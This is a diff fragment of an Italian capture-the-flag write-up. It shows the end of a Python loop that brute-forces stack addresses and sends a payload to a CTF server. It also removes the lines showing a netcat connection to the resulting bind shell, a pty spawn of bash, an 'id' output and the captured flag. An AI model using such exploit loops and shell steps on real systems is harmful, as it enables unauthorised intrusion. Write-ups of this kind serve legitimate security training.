@@ -13,16 +13,4 @@ for x in range(0xbfffe000, 0xbfffffff):
         s.connect(('scusette.it', 6060))
         s.send(r)
         s.close()
-```
-una volta terminato il bruteforce abbiamo notato che il nostro comando era stato eseguito consentendoci l'accesso alla macchiana mediante la porta 31337
-```
-www-data@www:/var/www/CTF/support$ nc 10.0.0.165 31337
-nc 10.0.0.165 31337
-Insert password for JBZ TEAM: ***********
-python -c "import pty;pty.spawn('/bin/bash')"
-sysop@debian:/tmp/...$ id
-uid=1000(sysop) gid=1000(sysop) groups=1000(sysop),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
-```
-Abbiamo così ottenuto la flag nascosta sul server
-```
-pci zone flag: 95429c6709bb99d1ed06d2a99bc6ffbc
+
